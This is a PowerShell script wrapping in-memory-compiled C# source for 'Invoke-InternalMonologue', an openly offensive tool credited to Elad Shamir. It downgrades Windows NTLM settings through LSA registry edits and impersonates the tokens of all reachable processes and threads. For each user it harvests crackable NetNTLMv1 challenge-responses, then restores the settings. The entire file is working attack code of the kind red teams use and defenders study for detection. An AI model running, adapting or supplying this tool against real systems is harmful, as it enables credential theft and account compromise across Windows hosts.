function Invoke-InternalMonologue
{
<#
.SYNOPSIS
Retrieves NTLMv1 challenge-response for all available users

.DESCRIPTION
Downgrades to NTLMv1, impersonates all available users and retrieves a challenge-response for each.
	
Author: Elad Shamir (https://linkedin.com/in/eladshamir)

.EXAMPLE
Invoke-InternalMonologue

.LINK
https://github.com/eladshamir/Internal-Monologue

.PARAMETER Challenge
Specifies the NTLM challenge to be used. An 8-byte long value in ascii-hex representation. Optional. Defult is 1122334455667788.

.PARAMETER Downgrade
Specifies whether to perform an NTLM downgrade or not [True/False]. Optional. Defult is true. Use switch to disable Downgrade

.PARAMETER Impersonate
Specifies whether to try to impersonate all other available users or not [True/False]. Optional. Defult is true. Use switch to disable Impersonate

.PARAMETER Restore
Specifies whether to restore the original values from before the NTLM downgrade or not [True/False]. Optional. Defult is true. Use switch to disable Restore

.PARAMETER Verbose
Specifies whether print verbose output or not [True/False]. Optional. Defult is false.

#>

[CmdletBinding()]
Param(
	[Parameter(Position = 0)]
	[String]
	$Challenge,
	
	[Switch]
	$Downgrade,
	
	[Switch]
	$Impersonate,
	
	[Switch]
	$Restore
)

# Invert flags so that options run by default; Switches are used to disable a feature
if ($Downgrade){$Downgrade = $False} Else {$Downgrade = $True}
if ($Impersonate){$Impersonate = $False} Else {$Impersonate = $True}
if ($Restore){$Restore = $False} Else {$Restore = $True}
if ($PSBoundParameters['Verbose']){$v = $True} Else {$v = $False}
if ($Challenge -eq $null -or $Challenge -eq ""){$Challenge = "1122334455667788"}

$Source = @"
using System;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace InternalMonologue
{
    public class Program
    {
        const int MAX_TOKEN_SIZE = 12288;

        struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public SID_AND_ATTRIBUTES[] Groups;
        };

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("secur32.dll", CharSet = CharSet.Auto)]
        static extern int AcquireCredentialsHandle(
            string pszPrincipal,
            string pszPackage,
            int fCredentialUse,
            IntPtr PAuthenticationID,
            IntPtr pAuthData,
            int pGetKeyFn,
            IntPtr pvGetKeyArgument,
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            IntPtr phContext,
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            IntPtr pInput,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_HANDLE phContext,  
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            ref SecBufferDesc SecBufferDesc,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            int DesiredAccess,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            int DesiredAccess,
            bool OpenAsSelf,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            int TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            int dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            int ImpersonationLevel,
            int dwTokenType,
            ref IntPtr phNewToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(
            IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle,
            IntPtr dwThreadId);

        private static void GetRegKey(string key, string name, out object result)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key);
            if (Lsa != null)
            {
                object value = Lsa.GetValue(name);
                if (value != null)
                {
                    result = value;
                    return;
                }
            }
            result = null;
        }

        private static void SetRegKey(string key, string name, object value)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true);
            if (Lsa != null)
            {
                if (value == null)
                {
                    Lsa.DeleteValue(name);
                }
                else
                {
                    Lsa.SetValue(name, value);
                }
            }
        }

        private static void ExtendedNTLMDowngrade(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
        {
            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", out oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", out oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 536870912);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", out oldValue_RestrictSendingNTLMTraffic);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0);
        }

        private static void NTLMRestore(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic)
        {
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
        }

        //Retrieves the SID of a given token
        public static string GetLogonId(IntPtr token)
        {
            string SID = null;
            try
            {
                StringBuilder sb = new StringBuilder();
                int TokenInfLength = 1024;
                IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
                Boolean Result = GetTokenInformation(token, 1, TokenInformation, TokenInfLength, out TokenInfLength);
                if (Result)
                {
                    TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));

                    IntPtr pstr = IntPtr.Zero;
                    Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
                    SID = Marshal.PtrToStringAuto(pstr);
                    LocalFree(pstr);
                }

                Marshal.FreeHGlobal(TokenInformation);

                return SID;
            }
            catch 
            {
                CloseHandle(token);
                return null;
            }
        }

        public static void HandleProcess(Process process, string challenge, bool verbose)
        {
            try
            {
                var token = IntPtr.Zero;
                var dupToken = IntPtr.Zero;
                string SID = null;

                if (OpenProcessToken(process.Handle, 0x0008, ref token))
                {
                    //Get the SID of the token
                    SID = GetLogonId(token);
                    CloseHandle(token);

                    //Check if this user hasn't been handled yet
                    if (SID != null && authenticatedUsers.Contains(SID) == false)
                    {
                        if (OpenProcessToken(process.Handle, 0x0002, ref token))
                        {
                            var sa = new SECURITY_ATTRIBUTES();
                            sa.nLength = Marshal.SizeOf(sa);

                            DuplicateTokenEx(
                                token,
                                0x0002 | 0x0008,
                                ref sa,
                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                (int)1,
                                ref dupToken);

                            CloseHandle(token);

                            try
                            {
                                using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                                {
                                    if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
                                    string result = InternalMonologueForCurrentUser(challenge);
                                    //Ensure it is a valid response and not blank
                                    if (result != null && result.Length > 0)
                                    {
                                        Console.WriteLine(result);
                                        authenticatedUsers.Add(SID);
                                    }
                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
                                }
                            }
                            catch
                            { /*Does not need to do anything if it fails*/ }
                            finally
                            {
                                CloseHandle(dupToken);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            { /*Does not need to do anything if it fails*/ }
        }

        public static void HandleThread(ProcessThread thread, string challenge, bool verbose)
        {
            try
            {
                var token = IntPtr.Zero;
                var dupToken = IntPtr.Zero;
                string SID = null;

                //Try to get thread handle
                var handle = OpenThread(0x0040, true, new IntPtr(thread.Id));

                //If failed, return
                if (handle == IntPtr.Zero)
                {
                    return;
                }

                if (OpenThreadToken(handle, 0x0008, true, ref token))
                {
                    //Get the SID of the token
                    SID = GetLogonId(token);
                    CloseHandle(token);

                    //Check if this user hasn't been handled yet
                    if (SID != null && authenticatedUsers.Contains(SID) == false)
                    {
                        if (OpenThreadToken(handle, 0x0002, true, ref token))
                        {
                            var sa = new SECURITY_ATTRIBUTES();
                            sa.nLength = Marshal.SizeOf(sa);

                            DuplicateTokenEx(
                                token,
                                0x0002 | 0x0008,
                                ref sa,
                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                (int)1,
                                ref dupToken);

                            CloseHandle(token);

                            try
                            {
                                using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                                {
                                    if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
                                    string result = InternalMonologueForCurrentUser(challenge);
                                    //Ensure it is a valid response and not blank
                                    if (result != null && result.Length > 0)
                                    {
                                        Console.WriteLine(result);
                                        authenticatedUsers.Add(SID);
                                    }
                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
                                }
                            }
                            catch 
                            { /*Does not need to do anything if it fails*/ }
                            finally
                            {
                                CloseHandle(dupToken);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            { /*Does not need to do anything if it fails*/ }
        }

        //Maintains a list of handled users
        static List<string> authenticatedUsers = new List<string>();

        //Parse command line arguments
        static Dictionary<string, string> ParseArgs(string[] args)
        {
            Dictionary<string, string> ret = new Dictionary<string, string>();
            if (args.Length % 2 == 0 && args.Length > 0)
            {
                for (int i = 0; i < args.Length; i = i + 2)
                {
                    ret.Add(args[i].Substring(1).ToLower(), args[i + 1].ToLower());
                }
            }
            return ret;
        }

        private static void PrintError(string message)
        {
            Console.WriteLine();
            Console.WriteLine("Error: " + message);
            PrintHelp();
        }

        private static void PrintHelp()
        {
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine("InternalMonologue -Downgrade True/False -Restore True/False - Impersonate True/False -Verbose True/False -Challenge ascii-hex");
            Console.WriteLine("Example:");
            Console.WriteLine("InternalMonologue -Downgrade False -Restore False -Impersonate True -Verbose False -Challenge 1122334455667788");
            Console.WriteLine();
            Console.WriteLine("Downgrade - Specifies whether to perform an NTLM downgrade or not [True/False]. Optional. Defult is true.");
            Console.WriteLine("Restore - Specifies whether to restore the original values from before the NTLM downgrade or not [True/False]. Optional. Defult is true.");
            Console.WriteLine("Impersonate - Specifies whether to try to impersonate all other available users or not [True/False]. Optional. Defult is true.");
            Console.WriteLine("Verbose - Specifies whether print verbose output or not [True/False]. Optional. Defult is false.");
            Console.WriteLine("Challenge - Specifies the NTLM challenge to be used. An 8-byte long value in ascii-hex representation. Optional. Defult is 1122334455667788.");
            Console.WriteLine();
        }

        public static void Main(string[] args)
        {
            Dictionary<string, string> argDict = ParseArgs(args);
            //Set defaults
            bool impersonate = true, downgrade = true, restore = true, verbose = false;
            string challenge = "1122334455667788";

            if (args.Length > 0 && argDict.Count == 0)
            {
                PrintHelp();
                return;
            }
            else if (args.Length == 0)
            {
                Console.Error.WriteLine("Running with default settings. Type -Help for more information.\n");

            }

            if (argDict.ContainsKey("impersonate"))
            {
                if (bool.TryParse(argDict["impersonate"], out impersonate) == false)
                {
                    PrintError("Impersonate must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("downgrade"))
            {
                if (bool.TryParse(argDict["downgrade"], out downgrade) == false)
                {
                    PrintError("Downgrade must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("restore"))
            {
                if (bool.TryParse(argDict["restore"], out restore) == false)
                {
                    PrintError("Restore must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("verbose"))
            {
                if (bool.TryParse(argDict["verbose"], out verbose) == false)
                {
                    PrintError("Verbose must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("challenge"))
            {
                challenge = argDict["challenge"].ToUpper();
                if (Regex.IsMatch(challenge, @"^[0-9A-F]{16}$") == false)
                {
                    PrintError("Challenge must be a 8-byte long value in asciihex representation.  (e.g. 1122334455667788)");
                    return;
                }
            }


            //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
            if (IsElevated())
            {
                if (verbose == true) Console.WriteLine("Running elevated");
                object oldValue_LMCompatibilityLevel = null;
                object oldValue_NtlmMinClientSec = null;
                object oldValue_RestrictSendingNTLMTraffic = null;
                if (downgrade == true)
                {
                    if (verbose == true) Console.WriteLine("Performing NTLM Downgrade");
                    //Perform an Extended NetNTLM Downgrade and store the current values to restore them later
                    ExtendedNTLMDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic);
                }

                if (impersonate == true)
                {
                    if (verbose == true) Console.WriteLine("Starting impersonation");
                    foreach (Process process in Process.GetProcesses())
                    {
                        if (process.ProcessName.Contains("lsass") == false) // Do not touch LSASS
                        {
                            HandleProcess(process, challenge, verbose);
                            foreach (ProcessThread thread in process.Threads)
                            {
                                HandleThread(thread, challenge, verbose);
                            }
                        }
                    }
                }
                else
                {
                    if (verbose == true) Console.WriteLine("Performing attack on current user only (no impersonation)");
                    Console.WriteLine(InternalMonologueForCurrentUser(challenge));
                }

                if (downgrade == true && restore == true)
                {
                    if (verbose == true) Console.WriteLine("Restoring NTLM values");
                    //Undo changes made in the Extended NetNTLM Downgrade
                    NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
                }
            }
            else
            {
                //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user
                if (verbose == true) Console.WriteLine("Not elevated. Performing attack with current NTLM settings on current user");
                Console.WriteLine(InternalMonologueForCurrentUser(challenge));
            }           
        }

        //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
        private static string InternalMonologueForCurrentUser(string challenge)
        {
            SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            SECURITY_HANDLE _hOutboundCred;
                _hOutboundCred.LowPart = _hOutboundCred.HighPart = IntPtr.Zero;
            SECURITY_INTEGER ClientLifeTime;
                ClientLifeTime.LowPart = 0;
                ClientLifeTime.HighPart = 0;
            SECURITY_HANDLE _hClientContext;
            uint ContextAttributes = 0;

            // Acquire credentials handle for current user
            AcquireCredentialsHandle(
                WindowsIdentity.GetCurrent().Name,
                "NTLM",
                2,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                ref _hOutboundCred,
                ref ClientLifeTime
                );

            // Get a type-1 message from NTLM SSP
            InitializeSecurityContext(
                ref _hOutboundCred,
                IntPtr.Zero,
                WindowsIdentity.GetCurrent().Name,
                0x00000800,
                0,
                0x10,
                IntPtr.Zero,
                0,
                out _hClientContext,
                out ClientToken,
                out ContextAttributes,
                out ClientLifeTime
                );
            ClientToken.Dispose();

            ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            // Custom made type-2 message with the specified challenge
            byte[] challengeBytes = StringToByteArray(challenge);
            SecBufferDesc ServerToken = new SecBufferDesc(new byte[] { 78, 84, 76, 77, 83, 83, 80, 0, 2, 0, 0, 0, 0, 0, 0, 0, 40, 0, 0, 0, 1, 0x82, 0, 0, challengeBytes[0], challengeBytes[1], challengeBytes[2], challengeBytes[3], challengeBytes[4], challengeBytes[5], challengeBytes[6], challengeBytes[7], 0, 0, 0, 0, 0, 0, 0 });
            InitializeSecurityContext(
                ref _hOutboundCred,
                ref _hClientContext,
                WindowsIdentity.GetCurrent().Name,
                0x00000800,
                0,
                0x10,
                ref ServerToken,
                0,
                out _hClientContext,
                out ClientToken,
                out ContextAttributes,
                out ClientLifeTime
                );
            byte[] result = ClientToken.GetSecBufferByteArray();

            ClientToken.Dispose();
            ServerToken.Dispose();

            //Extract the NetNTLM response from a type-3 message and return it
            return ParseNTResponse(result, challenge);
        }

        //This function parses the NetNTLM response from a type-3 message
        private static string ParseNTResponse(byte[] message, string challenge)
        {
            ushort lm_resp_len = BitConverter.ToUInt16(message, 12);
            uint lm_resp_off = BitConverter.ToUInt32(message, 16);
            ushort nt_resp_len = BitConverter.ToUInt16(message, 20);
            uint nt_resp_off = BitConverter.ToUInt32(message, 24);
            ushort domain_len = BitConverter.ToUInt16(message, 28);
            uint domain_off = BitConverter.ToUInt32(message, 32);
            ushort user_len = BitConverter.ToUInt16(message, 36);
            uint user_off = BitConverter.ToUInt32(message, 40);
            byte[] lm_resp = new byte[lm_resp_len];
            byte[] nt_resp = new byte[nt_resp_len];
            byte[] domain = new byte[domain_len];
            byte[] user = new byte[user_len];
            Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len);
            Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
            Array.Copy(message, domain_off, domain, 0, domain_len);
            Array.Copy(message, user_off, user, 0, user_len);

            string result = null;
            if (nt_resp_len == 24)
            {
                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + ByteArrayToString(lm_resp) + ":" + ByteArrayToString(nt_resp) + ":" + challenge;
            }
            else if (nt_resp_len > 24)
            {
                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + challenge + ":" + ByteArrayToString(nt_resp).Substring(0,32) + ":" + ByteArrayToString(nt_resp).Substring(32);
            }
            
            return result;
        }

        //The following function is taken from https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
        private static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        //This function is taken from https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
        private static bool IsElevated()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
        }

        //This function is taken from https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static byte[] StringToByteArray(string hex)
        {
            if (hex.Length % 2 == 1)
                return null;

            byte[] arr = new byte[hex.Length >> 1];

            for (int i = 0; i < hex.Length >> 1; ++i)
            {
                arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + (GetHexVal(hex[(i << 1) + 1])));
            }

            return arr;
        }

        //This function is taken from https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static int GetHexVal(char hex)
        {
            int val = (int)hex;
            return val - (val < 58 ? 48 : 55);
        }

        //This function is taken from https://stackoverflow.com/questions/5613279/c-sharp-hex-to-ascii
        public static string ConvertHex(String hexString)
        {
            string ascii = string.Empty;

            for (int i = 0; i < hexString.Length; i += 2)
            {
                String hs = string.Empty;

                hs = hexString.Substring(i, 2);
                if (hs == "00")
                    continue;
                uint decval = System.Convert.ToUInt32(hs, 16);
                char character = System.Convert.ToChar(decval);
                ascii += character;

            }

            return ascii;         
        }
    }

    struct SecBuffer : IDisposable
    {
        public int cbBuffer;
        public int BufferType;
        public IntPtr pvBuffer;

        public SecBuffer(int bufferSize)
        {
            cbBuffer = bufferSize;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(bufferSize);
        }

        public SecBuffer(byte[] secBufferBytes)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public SecBuffer(byte[] secBufferBytes, int bufferType)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = (int)bufferType;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public void Dispose()
        {
            if (pvBuffer != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(pvBuffer);
                pvBuffer = IntPtr.Zero;
            }
        }
    }

    struct SecBufferDesc : IDisposable
    {
        public int ulVersion;
        public int cBuffers;
        public IntPtr pBuffers;

        public SecBufferDesc(int bufferSize)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(bufferSize);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public SecBufferDesc(byte[] secBufferBytes)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(secBufferBytes);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public void Dispose()
        {
            if (pBuffers != IntPtr.Zero)
            {
                if (cBuffers == 1)
                {
                    SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
                    ThisSecBuffer.Dispose();
                }
                else
                {
                    for (int Index = 0; Index < cBuffers; Index++)
                    {
                        int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                        IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                        Marshal.FreeHGlobal(SecBufferpvBuffer);
                    }
                }

                Marshal.FreeHGlobal(pBuffers);
                pBuffers = IntPtr.Zero;
            }
        }

        public byte[] GetSecBufferByteArray()
        {
            byte[] Buffer = null;

            if (pBuffers == IntPtr.Zero)
            {
                throw new InvalidOperationException("Object has already been disposed!!!");
            }

            if (cBuffers == 1)
            {
                SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));

                if (ThisSecBuffer.cbBuffer > 0)
                {
                    Buffer = new byte[ThisSecBuffer.cbBuffer];
                    Marshal.Copy(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer);
                }
            }
            else
            {
                int BytesToAllocate = 0;

                for (int Index = 0; Index < cBuffers; Index++)
                {
                    //calculate the total number of bytes we need to copy...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    BytesToAllocate += Marshal.ReadInt32(pBuffers, CurrentOffset);
                }

                Buffer = new byte[BytesToAllocate];

                for (int Index = 0, BufferIndex = 0; Index < cBuffers; Index++)
                {
                    //Now iterate over the individual buffers and put them together into a byte array...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    int BytesToCopy = Marshal.ReadInt32(pBuffers, CurrentOffset);
                    IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                    Marshal.Copy(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy);
                    BufferIndex += BytesToCopy;
                }
            }

            return (Buffer);
        }
    }

    struct SECURITY_INTEGER
    {
        public uint LowPart;
        public int HighPart;
    };

    struct SECURITY_HANDLE
    {
        public IntPtr LowPart;
        public IntPtr HighPart;

    };

    struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }
}

"@

$inmem=New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
$inmem.GenerateInMemory=1
$inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Location))))

Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $inmem

# Setting a custom stdout to capture Console.WriteLine output
# https://stackoverflow.com/questions/33111014/redirecting-output-from-an-external-dll-in-powershell
$OldConsoleOut = [Console]::Out
$StringWriter = New-Object IO.StringWriter
[Console]::SetOut($StringWriter)

# Space needed in front of dictionary key name
[InternalMonologue.Program]::Main(@(" challenge",$Challenge," downgrade",$Downgrade," impersonate",$Impersonate," restore",$Restore," verbose",$v))

# Restore the regular STDOUT object
[Console]::SetOut($OldConsoleOut)
$Results = $StringWriter.ToString()
$Results
}
